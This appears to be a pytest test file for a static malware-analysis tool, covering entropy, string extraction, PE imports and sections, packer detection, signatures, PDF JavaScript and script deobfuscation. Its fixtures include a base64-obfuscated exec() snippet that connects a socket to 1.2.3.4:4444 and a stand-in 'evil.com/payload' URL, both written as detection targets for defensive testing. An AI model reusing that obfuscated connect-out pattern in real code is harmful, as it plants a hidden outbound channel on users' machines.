# Phase 2 unit tests for tools/static_analysis.py
import struct
import tempfile
import os
from unittest.mock import MagicMock, patch

import pytest

from tools.static_analysis import (
    get_file_magic,
    get_entropy,
    extract_strings,
    get_pe_imports,
    get_pe_sections,
    detect_packer,
    check_digital_signature,
    get_compile_timestamp,
    analyze_pdf_structure,
    deobfuscate_script,
    _shannon_entropy,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

def _make_pe_bytes() -> bytes:
    """Build a minimal valid PE32 binary for testing."""
    # DOS stub: MZ header with e_lfanew pointing to offset 0x80
    dos_stub = bytearray(0x80)
    dos_stub[0] = 0x4D  # M
    dos_stub[1] = 0x5A  # Z
    dos_stub[0x3C] = 0x80  # e_lfanew = 0x80

    # PE signature at 0x80
    pe_header = bytearray()
    pe_header += b"PE\x00\x00"           # Signature
    pe_header += struct.pack("<H", 0x14C)  # Machine: i386
    pe_header += struct.pack("<H", 1)     # NumberOfSections
    pe_header += struct.pack("<I", 0x5A3E1B00)  # TimeDateStamp
    pe_header += struct.pack("<I", 0)    # PointerToSymbolTable
    pe_header += struct.pack("<I", 0)    # NumberOfSymbols
    pe_header += struct.pack("<H", 0xE0)  # SizeOfOptionalHeader
    pe_header += struct.pack("<H", 0x102)  # Characteristics

    # Optional header (PE32, magic 0x10B)
    opt = bytearray(0xE0)
    opt[0] = 0x0B
    opt[1] = 0x01  # Magic = 0x010B (PE32)

    # DATA_DIRECTORY (16 entries × 8 bytes = 128 bytes): all zeros
    # (already zero in opt bytearray)

    # Section header: .text
    sec = bytearray(40)
    sec[0:5] = b".text"
    struct.pack_into("<I", sec, 16, 0x1000)   # VirtualSize
    struct.pack_into("<I", sec, 20, 0x1000)   # VirtualAddress
    struct.pack_into("<I", sec, 24, 0x200)    # SizeOfRawData
    struct.pack_into("<I", sec, 28, 0x200)    # PointerToRawData
    struct.pack_into("<I", sec, 36, 0x60000020)  # Characteristics (code, exec, read)

    # Section data (512 bytes of 0xCC = INT3 to make it recognisable)
    sec_data = b"\xCC" * 0x200

    result = bytes(dos_stub) + bytes(pe_header) + bytes(opt) + bytes(sec) + sec_data
    # Pad to align section at 0x200
    pad = b"\x00" * (0x200 - len(bytes(dos_stub) + bytes(pe_header) + bytes(opt) + bytes(sec)))
    return bytes(dos_stub) + bytes(pe_header) + bytes(opt) + bytes(sec) + (pad if len(pad) >= 0 else b"") + sec_data


@pytest.fixture
def tmp_file(tmp_path):
    """Return a factory that writes bytes to a temp file and returns its path."""
    def _write(content: bytes, suffix: str = ".bin") -> str:
        p = tmp_path / f"sample{suffix}"
        p.write_bytes(content)
        return str(p)
    return _write


@pytest.fixture
def benign_text_file(tmp_path):
    p = tmp_path / "hello.txt"
    p.write_text("Hello, world! This is a perfectly benign text file.\n" * 10)
    return str(p)


@pytest.fixture
def upx_file(tmp_path):
    """File containing UPX signatures."""
    content = b"MZ" + b"\x00" * 0x3C + b"\x80\x00\x00\x00" + b"\x00" * 0x40
    content += b"UPX0" + b"\x00" * 10 + b"UPX1" + b"\x00" * 10 + b"UPX!" + b"3.96" + b"\x00" * 200
    p = tmp_path / "packed.exe"
    p.write_bytes(content)
    return str(p)


@pytest.fixture
def script_b64(tmp_path):
    import base64
    payload = base64.b64encode(b"import socket; s=socket.socket(); s.connect(('1.2.3.4', 4444))")
    content = b"exec(__import__('base64').b64decode('" + payload + b"'))"
    p = tmp_path / "mal.py"
    p.write_bytes(content)
    return str(p)


# ---------------------------------------------------------------------------
# _shannon_entropy helper
# ---------------------------------------------------------------------------

class TestShannonEntropy:
    def test_uniform_data_is_high(self):
        data = bytes(range(256)) * 4
        assert _shannon_entropy(data) > 7.9

    def test_constant_data_is_zero(self):
        assert _shannon_entropy(b"\x00" * 1000) == 0.0

    def test_empty_data_is_zero(self):
        assert _shannon_entropy(b"") == 0.0


# ---------------------------------------------------------------------------
# get_file_magic
# ---------------------------------------------------------------------------

class TestGetFileMagic:
    def test_detects_type(self, benign_text_file):
        mock_magic = MagicMock()
        mock_magic.from_file.side_effect = ["ASCII text", "text/plain"]
        with patch("tools.static_analysis.magic") as m:
            m.from_file.side_effect = ["ASCII text", "text/plain"]
            result = get_file_magic(benign_text_file)
        assert "magic_type" in result
        assert "mime" in result

    def test_missing_file_returns_error(self, tmp_path):
        result = get_file_magic(str(tmp_path / "nonexistent.bin"))
        assert "error" in result

    def test_magic_import_error_returns_error(self, benign_text_file):
        with patch("tools.static_analysis.magic", side_effect=ImportError("no magic")):
            result = get_file_magic(benign_text_file)
        # Should propagate error gracefully (module-level; magic is imported inside fn)
        # Accept either a result or an error dict
        assert isinstance(result, dict)


# ---------------------------------------------------------------------------
# get_entropy
# ---------------------------------------------------------------------------

class TestGetEntropy:
    def test_returns_overall_entropy(self, benign_text_file):
        result = get_entropy(benign_text_file)
        assert "overall_entropy" in result
        assert isinstance(result["overall_entropy"], float)

    def test_high_entropy_random_data(self, tmp_file):
        import os as _os
        content = _os.urandom(4096)
        path = tmp_file(content)
        result = get_entropy(path)
        assert result["overall_entropy"] > 7.0

    def test_missing_file_returns_error(self, tmp_path):
        result = get_entropy(str(tmp_path / "ghost.bin"))
        assert "error" in result

    def test_low_entropy_text(self, benign_text_file):
        result = get_entropy(benign_text_file)
        # Repetitive text should have entropy < 5
        assert result["overall_entropy"] < 5.5


# ---------------------------------------------------------------------------
# extract_strings
# ---------------------------------------------------------------------------

class TestExtractStrings:
    def test_finds_url_in_suspicious(self, tmp_file):
        content = b"AAA " + b"http://evil.com/payload " + b"ZZZ" + b"\x00" * 100
        path = tmp_file(content)
        result = extract_strings(path)
        assert "total_strings" in result
        assert "suspicious" in result
        assert any("http" in s for s in result["suspicious"])

    def test_missing_file_returns_error(self, tmp_path):
        result = extract_strings(str(tmp_path / "nope.bin"))
        assert "error" in result

    def test_min_length_respected(self, tmp_file):
        content = b"AB " + b"ABCDEFGHIJ" + b"\x00" * 50
        path = tmp_file(content)
        result = extract_strings(path, min_length=8)
        # "AB" (len 2) should NOT be in strings; "ABCDEFGHIJ" (len 10) should be
        assert result["total_strings"] >= 1

    def test_returns_dict_with_required_keys(self, benign_text_file):
        result = extract_strings(benign_text_file)
        assert "total_strings" in result
        assert "suspicious" in result
        assert isinstance(result["suspicious"], list)


# ---------------------------------------------------------------------------
# get_pe_imports
# ---------------------------------------------------------------------------

class TestGetPeImports:
    def test_returns_error_on_non_pe(self, benign_text_file):
        result = get_pe_imports(benign_text_file)
        assert "error" in result

    def test_suspicious_imports_flagged(self):
        mock_pe = MagicMock()
        mock_imp_entry = MagicMock()
        mock_imp_entry.dll = b"kernel32.dll"
        mock_func = MagicMock()
        mock_func.name = b"VirtualAllocEx"
        mock_func2 = MagicMock()
        mock_func2.name = b"WriteProcessMemory"
        mock_imp_entry.imports = [mock_func, mock_func2]
        mock_pe.DIRECTORY_ENTRY_IMPORT = [mock_imp_entry]
        with patch("tools.static_analysis.pefile.PE", return_value=mock_pe):
            result = get_pe_imports("fake.exe")
        assert "VirtualAllocEx" in result["suspicious_imports"]
        assert result["injection_apis_present"] is True

    def test_returns_required_keys(self):
        mock_pe = MagicMock()
        mock_pe.DIRECTORY_ENTRY_IMPORT = []
        with patch("tools.static_analysis.pefile.PE", return_value=mock_pe):
            result = get_pe_imports("fake.exe")
        for k in ("dlls", "suspicious_imports", "injection_apis_present", "network_apis_present"):
            assert k in result


# ---------------------------------------------------------------------------
# get_pe_sections
# ---------------------------------------------------------------------------

class TestGetPeSections:
    def test_returns_error_on_non_pe(self, benign_text_file):
        result = get_pe_sections(benign_text_file)
        assert "error" in result

    def test_returns_list_of_sections(self):
        mock_pe = MagicMock()
        mock_sec = MagicMock()
        mock_sec.Name = b".text\x00\x00\x00"
        mock_sec.get_data.return_value = b"\xCC" * 512
        mock_sec.Characteristics = 0x60000020  # exec + read
        mock_sec.Misc_VirtualSize = 512
        mock_sec.SizeOfRawData = 512
        mock_pe.sections = [mock_sec]
        with patch("tools.static_analysis.pefile.PE", return_value=mock_pe):
            result = get_pe_sections("fake.exe")
        assert isinstance(result, list)
        assert len(result) == 1
        assert result[0]["name"] == ".text"
        assert "entropy" in result[0]
        assert "executable" in result[0]["flags"]


# ---------------------------------------------------------------------------
# detect_packer
# ---------------------------------------------------------------------------

class TestDetectPacker:
    def test_upx_detected(self, upx_file):
        result = detect_packer(upx_file)
        assert result["packer_detected"] is True
        assert result["packer_name"] == "UPX"

    def test_no_packer_on_text_file(self, benign_text_file):
        result = detect_packer(benign_text_file)
        assert result["packer_detected"] is False

    def test_missing_file_returns_error(self, tmp_path):
        result = detect_packer(str(tmp_path / "missing.exe"))
        assert "error" in result

    def test_decompression_time_estimate_present(self, upx_file):
        result = detect_packer(upx_file)
        if result.get("packer_detected"):
            assert "decompression_time_estimate_ms" in result


# ---------------------------------------------------------------------------
# check_digital_signature
# ---------------------------------------------------------------------------

class TestCheckDigitalSignature:
    def test_unsigned_file_returns_signed_false(self, benign_text_file):
        mock_pe = MagicMock()
        mock_pe.OPTIONAL_HEADER.DATA_DIRECTORY = [MagicMock(Size=0)] * 16
        with patch("tools.static_analysis.pefile.PE", return_value=mock_pe):
            result = check_digital_signature(benign_text_file)
        assert result["signed"] is False

    def test_returns_required_keys(self, benign_text_file):
        mock_pe = MagicMock()
        mock_pe.OPTIONAL_HEADER.DATA_DIRECTORY = [MagicMock(Size=0)] * 16
        with patch("tools.static_analysis.pefile.PE", return_value=mock_pe):
            result = check_digital_signature(benign_text_file)
        for k in ("signed", "valid", "signer", "reason", "cert_expired"):
            assert k in result

    def test_missing_file_returns_error(self, tmp_path):
        result = check_digital_signature(str(tmp_path / "missing.exe"))
        assert "error" in result or "signed" in result


# ---------------------------------------------------------------------------
# get_compile_timestamp
# ---------------------------------------------------------------------------

class TestGetCompileTimestamp:
    def test_zeroed_timestamp_is_suspicious(self):
        mock_pe = MagicMock()
        mock_pe.FILE_HEADER.TimeDateStamp = 0
        with patch("tools.static_analysis.pefile.PE", return_value=mock_pe):
            result = get_compile_timestamp("fake.exe")
        assert result["suspicious"] is True

    def test_midnight_timestamp_is_suspicious(self):
        import calendar
        # 2018-03-14 00:00:00 UTC
        ts = calendar.timegm((2018, 3, 14, 0, 0, 0, 0, 0, 0))
        mock_pe = MagicMock()
        mock_pe.FILE_HEADER.TimeDateStamp = ts
        with patch("tools.static_analysis.pefile.PE", return_value=mock_pe):
            result = get_compile_timestamp("fake.exe")
        assert result["suspicious"] is True

    def test_valid_timestamp_not_suspicious(self):
        import calendar
        ts = calendar.timegm((2022, 6, 15, 13, 42, 7, 0, 0, 0))
        mock_pe = MagicMock()
        mock_pe.FILE_HEADER.TimeDateStamp = ts
        with patch("tools.static_analysis.pefile.PE", return_value=mock_pe):
            result = get_compile_timestamp("fake.exe")
        assert result["suspicious"] is False

    def test_returns_error_on_bad_file(self, benign_text_file):
        result = get_compile_timestamp(benign_text_file)
        assert "error" in result or "timestamp" in result


# ---------------------------------------------------------------------------
# analyze_pdf_structure
# ---------------------------------------------------------------------------

class TestAnalyzePdfStructure:
    def test_non_pdf_returns_error_or_empty(self, benign_text_file):
        result = analyze_pdf_structure(benign_text_file)
        # Either an error key or the default empty structure is acceptable
        assert isinstance(result, dict)

    def test_returns_required_keys(self, tmp_path):
        result = analyze_pdf_structure(str(tmp_path / "missing.pdf"))
        assert isinstance(result, dict)
        # May have error key or required structure keys
        if "error" not in result:
            for k in ("has_javascript", "embedded_files", "suspicious_actions",
                      "stream_filters", "obfuscated_js"):
                assert k in result

    def test_javascript_detected_via_mock(self, tmp_path):
        import pikepdf
        fake_pdf = tmp_path / "test.pdf"
        fake_pdf.write_bytes(b"not a real pdf")

        mock_root = MagicMock(spec=pikepdf.Dictionary)
        mock_root.__contains__ = lambda s, k: False
        mock_root.items.return_value = [
            (pikepdf.Name("/JavaScript"), pikepdf.String("alert(1)")),
        ]
        mock_pdf = MagicMock()
        mock_pdf.Root = mock_root
        mock_pdf.pages = []
        with patch("tools.static_analysis.pikepdf.open", return_value=mock_pdf):
            result = analyze_pdf_structure(str(fake_pdf))
        assert result.get("has_javascript") is True


# ---------------------------------------------------------------------------
# deobfuscate_script
# ---------------------------------------------------------------------------

class TestDeobfuscateScript:
    def test_base64_obfuscation_detected(self, script_b64):
        result = deobfuscate_script(script_b64)
        assert result["obfuscation_detected"] is True
        assert "base64_encoding" in result["techniques"]

    def test_clean_script_not_obfuscated(self, tmp_file):
        path = tmp_file(b"print('hello world')\n", suffix=".py")
        result = deobfuscate_script(path)
        assert result["obfuscation_detected"] is False

    def test_eval_exec_detected(self, tmp_file):
        path = tmp_file(b"eval(compile('x=1','f','exec'))\n", suffix=".py")
        result = deobfuscate_script(path)
        assert "eval_exec" in result["techniques"]

    def test_returns_required_keys(self, benign_text_file):
        result = deobfuscate_script(benign_text_file)
        for k in ("obfuscation_detected", "techniques", "deobfuscated_snippet"):
            assert k in result

    def test_missing_file_returns_error(self, tmp_path):
        result = deobfuscate_script(str(tmp_path / "missing.ps1"))
        assert "error" in result
